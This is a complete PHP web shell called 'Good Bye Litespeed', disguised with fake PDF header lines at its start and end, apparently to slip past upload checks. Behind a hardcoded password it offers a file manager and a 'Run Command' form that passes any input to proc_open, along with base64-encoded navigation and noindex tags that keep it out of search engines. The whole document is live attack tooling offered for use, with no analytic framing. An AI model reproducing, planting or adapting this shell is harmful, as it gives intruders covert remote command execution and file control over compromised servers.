%PDF-1.7
%ÂµÂµÂµÂµ
1 0 obj
<?php
session_start();
error_reporting(0);

// Login Configuration - CHANGE THESE!
$valid_username = "./heartzz";
$valid_password = "Litespeed@2024";

// Check if user is logged in
function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['login_time'] = time();
        $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password!";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Auto-logout after 1 hour of inactivity
if (isLoggedIn() && (time() - $_SESSION['login_time']) > 3600) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show login page
if (!isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Good Bye Litespeed - Login</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex">
        <meta name="googlebot" content="noindex">
        <link href="https://fonts.googleapis.com/css?family=Arial+Black&display=swap" rel="stylesheet">
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
        <style>
            * {
                cursor: ur[](https://ani.cursors-4u.net/cursors/cur-13/cur1161.ani), auto !important;
            }
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            .login-container {
                backdrop-filter: blur(10px);
                background: rgba(255, 255, 255, 0.95);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
        </style>
    </head>
    <body class="bg-gray-900 text-white font-sans min-h-screen flex items-center justify-center">
        <div class="login-container bg-gray-800 p-8 rounded-lg shadow-2xl w-full max-w-md">
            <div class="text-center mb-8">
                <h1 class="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-600">
                    Good Bye Litespeed
                </h1>
                <p class="text-gray-400 mt-2">[./Heartzz] v.1.3</p>
                <p class="text-sm text-gray-500 mt-2">Secure Access Required</p>
            </div>
            
            <?php if (isset($login_error)): ?>
                <div class="bg-red-500 text-white p-3 rounded-lg mb-4 text-center">
                    <i class="fas fa-exclamation-triangle mr-2"></i> <?php echo $login_error; ?>
                </div>
            <?php endif; ?>
            
            <form method="post" class="space-y-6">
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-300 mb-2">
                        <i class="fas fa-user mr-2"></i>Username
                    </label>
                    <input type="text" id="username" name="username" required autofocus
                           class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500 text-white">
                </div>
                
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-300 mb-2">
                        <i class="fas fa-lock mr-2"></i>Password
                    </label>
                    <input type="password" id="password" name="password" required
                           class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500 text-white">
                </div>
                
                <button type="submit" name="login" 
                        class="w-full bg-gradient-to-r from-purple-500 to-pink-600 text-white font-bold py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-700 transform hover:-translate-y-1 transition-all duration-200">
                    <i class="fas fa-sign-in-alt mr-2"></i>Login
                </button>
            </form>
            
            <div class="mt-6 text-center text-sm text-gray-500">
                <p>© 2024 ./Heartzz. All rights reserved.</p>
            </div>
        </div>
        
        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </body>
    </html>
    <?php
    exit;
}

// MAIN SHELL CODE STARTS HERE
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b) {
    return base64_encode($b);
}

function y($b) {
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<div class='bg-green-500 text-white p-3 rounded-lg mb-4'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success</div>";
        } else {
            echo "<div class='bg-red-500 text-white p-3 rounded-lg mb-4'>Sorry, there was an error uploading your file.</div>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo '<div class="bg-green-500 text-white p-3 rounded-lg mb-4">Folder created successfully!</div>';
        } else {
            echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Folder already exists!</div>';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<div class="bg-green-500 text-white p-3 rounded-lg mb-4">File created successfully!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Failed to create file!</div>';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<div class="bg-green-500 text-white p-3 rounded-lg mb-4">File edited successfully!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Failed to edit file!</div>';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<div class="bg-green-500 text-white p-3 rounded-lg mb-4">Folder deleted successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Failed to delete folder!</div>';
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo '<div class="bg-green-500 text-white p-3 rounded-lg mb-4">File deleted successfully!</div>';
                } else {
                    echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Failed to delete file!</div>';
                }
            }
        } else {
            echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: File or directory not found!</div>';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<div class="bg-green-500 text-white p-3 rounded-lg mb-4">Item renamed successfully!</div>';
            } else {
                echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Failed to rename item!</div>';
            }
        } else {
            echo '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Item not found!</div>';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<div class="mt-4"><p class="font-bold mb-2">Result:</p><textarea class="w-full p-3 bg-gray-800 text-gray-300 border border-gray-600 rounded-lg font-mono" readonly rows="10">' . htmlspecialchars($errors) . '</textarea></div>';
            } else {
                $viewCommandResult = '<div class="mt-4"><p class="font-bold mb-2">Result:</p><textarea class="w-full p-3 bg-gray-800 text-gray-300 border border-gray-600 rounded-lg font-mono" readonly rows="10">' . htmlspecialchars($output) . '</textarea></div>';
            }
        } else {
            $viewCommandResult = '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: Failed to execute command!</div>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<div class="mt-4"><p class="font-bold mb-2">Result: ' . $_POST['view_file'] . '</p><textarea class="w-full p-3 bg-gray-800 text-gray-300 border border-gray-600 rounded-lg font-mono" readonly rows="10">' . htmlspecialchars($fileContent) . '</textarea></div>';
        } else {
            $viewCommandResult = '<div class="bg-red-500 text-white p-3 rounded-lg mb-4">Error: File not found!</div>';
        }
    }
}

// Add logout button to header
echo '<div class="container mx-auto p-4">';
echo '<div class="flex justify-between items-center mb-4">';
echo '<div>';
echo '<h1 class="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-600">Good Bye Litespeed [./Heartzz]</h1>';
echo '<p class="text-lg italic text-gray-400">v.1.3</p>';
echo '</div>';
echo '<a href="?logout=true" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg transition-all duration-200">';
echo '<i class="fas fa-sign-out-alt mr-2"></i>Logout</a>';
echo '</div>';

echo "<p class='text-gray-300'>Zona waktu server: " . $timezone . "</p>";
echo "<p class='text-gray-300 mb-4'>Waktu server saat ini: " . date('Y-m-d H:i:s') . "</p>";
echo '<hr class="my-4 border-gray-700">';
echo '<div class="mb-4 text-gray-300">curdir: ';

$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
foreach ($directories as $index => $dir) {
    if (!empty($dir)) {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400 hover:text-blue-300">' . $dir . '</a>';
    }
}

echo ' / <a href="?d=' . x($scriptDirectory) . '" class="text-green-400 hover:text-green-300">[ GO Home ]</a>';
echo '</div>';
echo '<hr class="my-4 border-gray-700">';

echo '<div class="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4 mb-8">';
echo '<button onclick="openModal(\'createFolderModal\')" class="flex-1 p-3 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-all duration-200"><i class="fas fa-folder-plus mr-2"></i>Create Folder</button>';
echo '<button onclick="openModal(\'createEditFileModal\')" class="flex-1 p-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-all duration-200"><i class="fas fa-file-edit mr-2"></i>Create / Edit File</button>';
echo '<button onclick="openModal(\'uploadFileModal\')" class="flex-1 p-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg transition-all duration-200"><i class="fas fa-upload mr-2"></i>Upload File</button>';
echo '<button onclick="openModal(\'runCommandModal\')" class="flex-1 p-3 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-all duration-200"><i class="fas fa-terminal mr-2"></i>Run Command</button>';
echo '</div>';

echo $viewCommandResult;

echo '<div class="overflow-x-auto">';
echo '<table class="min-w-full bg-gray-800 text-gray-300 border border-gray-700 rounded-lg">';
echo '<thead class="bg-gray-700"><tr><th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">Item Name</th><th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">Size</th><th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">Date</th><th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">Permissions</th><th class="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider">Actions</th></tr></thead>';
echo '<tbody class="divide-y divide-gray-700">';

foreach (scandir($currentDirectory) as $v) {
    if ($v == '.' || $v == '..') continue;
    
    $u = realpath($v);
    $s = stat($u);
    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?d=' . x($currentDirectory) . '&f=' . x($v);
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = is_writable($u);
    
    echo '<tr class="' . ($writable ? 'bg-gray-800' : 'bg-gray-900') . ' hover:bg-gray-700">';
    echo '<td class="px-6 py-4"><a href="' . $itemLink . '" class="text-blue-400 hover:text-blue-300"><i class="' . (is_dir($v) ? 'fas fa-folder' : 'fas fa-file') . ' mr-2"></i>' . $v . '</a></td>';
    echo '<td class="px-6 py-4">' . (is_dir($v) ? '-' : formatSize(filesize($u))) . '</td>';
    echo '<td class="px-6 py-4">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>';
    echo '<td class="px-6 py-4"><span class="px-2 py-1 ' . ($writable ? 'bg-green-600' : 'bg-red-600') . ' text-white rounded text-xs">' . $permission . '</span></td>';
    echo '<td class="px-6 py-4"><div class="flex space-x-2">';
    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" class="inline">';
    echo '<input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '">';
    echo '<button type="submit" class="text-blue-400 hover:text-blue-300" title="View"><i class="fas fa-eye"></i></button>';
    echo '</form>';
    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" class="inline" onsubmit="return confirm(\'Delete ' . $v . '?\')">';
    echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '">';
    echo '<button type="submit" class="text-red-400 hover:text-red-300" title="Delete"><i class="fas fa-trash"></i></button>';
    echo '</form>';
    echo '<button onclick="renameItem(\'' . htmlspecialchars($v) . '\')" class="text-yellow-400 hover:text-yellow-300" title="Rename"><i class="fas fa-edit"></i></button>';
    echo '</div></td>';
    echo '</tr>';
}

echo '</tbody></table></div>';
echo '</div>';

function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}
?>

<!-- Modals -->
<div id="createFolderModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
        <h2 class="text-2xl mb-4 text-white"><i class="fas fa-folder-plus mr-2 text-green-500"></i>Create Folder</h2>
        <form method="post">
            <input type="text" name="folder_name" placeholder="Folder Name" required
                   class="w-full p-3 mb-4 bg-gray-700 text-white border border-gray-600 rounded-lg focus:outline-none focus:border-green-500">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('createFolderModal')" 
                        class="flex-1 p-3 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-times mr-2"></i>Cancel
                </button>
                <button type="submit" 
                        class="flex-1 p-3 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-check mr-2"></i>Create
                </button>
            </div>
        </form>
    </div>
</div>

<div id="createEditFileModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-2xl w-full">
        <h2 class="text-2xl mb-4 text-white"><i class="fas fa-file-edit mr-2 text-blue-500"></i>Create / Edit File</h2>
        <form method="post">
            <input type="text" name="file_name" placeholder="File Name" required
                   class="w-full p-3 mb-4 bg-gray-700 text-white border border-gray-600 rounded-lg focus:outline-none focus:border-blue-500">
            <textarea name="file_content" placeholder="File Content" rows="15"
                      class="w-full p-3 mb-4 bg-gray-700 text-white border border-gray-600 rounded-lg font-mono focus:outline-none focus:border-blue-500"></textarea>
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('createEditFileModal')" 
                        class="flex-1 p-3 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-times mr-2"></i>Cancel
                </button>
                <button type="submit" 
                        class="flex-1 p-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-save mr-2"></i>Save
                </button>
            </div>
        </form>
    </div>
</div>

<div id="uploadFileModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
        <h2 class="text-2xl mb-4 text-white"><i class="fas fa-upload mr-2 text-yellow-500"></i>Upload File</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload" required
                   class="w-full p-3 mb-4 bg-gray-700 text-white border border-gray-600 rounded-lg">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('uploadFileModal')" 
                        class="flex-1 p-3 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-times mr-2"></i>Cancel
                </button>
                <button type="submit" name="submit" 
                        class="flex-1 p-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-upload mr-2"></i>Upload
                </button>
            </div>
        </form>
    </div>
</div>

<div id="runCommandModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
        <h2 class="text-2xl mb-4 text-white"><i class="fas fa-terminal mr-2 text-red-500"></i>Run Command</h2>
        <form method="post">
            <input type="text" name="cmd_input" placeholder="Enter command" required
                   class="w-full p-3 mb-4 bg-gray-700 text-white border border-gray-600 rounded-lg focus:outline-none focus:border-red-500 font-mono">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('runCommandModal')" 
                        class="flex-1 p-3 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-times mr-2"></i>Cancel
                </button>
                <button type="submit" 
                        class="flex-1 p-3 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-play mr-2"></i>Run
                </button>
            </div>
        </form>
    </div>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full">
        <h2 class="text-2xl mb-4 text-white"><i class="fas fa-edit mr-2 text-yellow-500"></i>Rename Item</h2>
        <form method="post">
            <input type="hidden" name="old_name" id="oldName">
            <input type="text" name="new_name" id="newName" placeholder="New Name" required
                   class="w-full p-3 mb-4 bg-gray-700 text-white border border-gray-600 rounded-lg focus:outline-none focus:border-yellow-500">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('renameModal')" 
                        class="flex-1 p-3 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-times mr-2"></i>Cancel
                </button>
                <button type="submit" name="rename_item" 
                        class="flex-1 p-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg transition-colors">
                    <i class="fas fa-check mr-2"></i>Rename
                </button>
            </div>
        </form>
    </div>
</div>

<!-- Font Awesome -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<script>
    function openModal(modalId) {
        document.getElementById(modalId).classList.remove('hidden');
    }

    function closeModal(modalId) {
        document.getElementById(modalId).classList.add('hidden');
    }
    
    function renameItem(oldName) {
        document.getElementById('oldName').value = oldName;
        document.getElementById('newName').value = oldName;
        openModal('renameModal');
    }
    
    // Close modal when clicking outside
    window.onclick = function(event) {
        if (event.target.classList.contains('fixed')) {
            event.target.classList.add('hidden');
        }
    }
</script>
</body>
</html>
%PDF-1.7
%ÂµÂµÂµÂµ
1 0 obj%PDF-1.7
%ÂµÂµÂµÂµ
1 0 obj%PDF-1.7
%ÂµÂµÂµÂµ
1 0 obj
